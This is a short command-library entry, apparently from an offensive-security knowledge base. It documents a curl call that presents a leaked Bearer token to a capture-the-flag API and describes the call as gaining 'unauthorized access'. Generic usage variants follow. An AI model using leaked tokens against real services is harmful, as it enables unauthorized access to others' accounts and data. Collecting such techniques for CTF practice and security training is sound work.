---
data: >-
  curl -H 'Authorization: Bearer LEAKED_TOKEN'
  'https://api.bountypay.h1ctf.com/challenges/solve'
tags:
  - api
  - auth
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:58.070Z'
id: 0f8629a6-b47e-4f52-babc-e1c4929a121d
verified: false
validated: true
submitted: true
---
# curl-api-auth

## Command

```bash
curl -H 'Authorization: Bearer LEAKED_TOKEN' 'https://api.bountypay.h1ctf.com/challenges/solve'
```

## Description

Authenticates to API using leaked Bearer token for unauthorized access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H Authorization` | Bearer token header | Yes |

## Examples

### Basic Usage

```bash
curl -H 'Authorization: Bearer tok' api-endpoint
```

### Advanced Usage

```bash
curl -H 'Authorization: Bearer tok' -X POST api
```

## Expected Output

API success response.

## Related

- [[Related Procedure]]
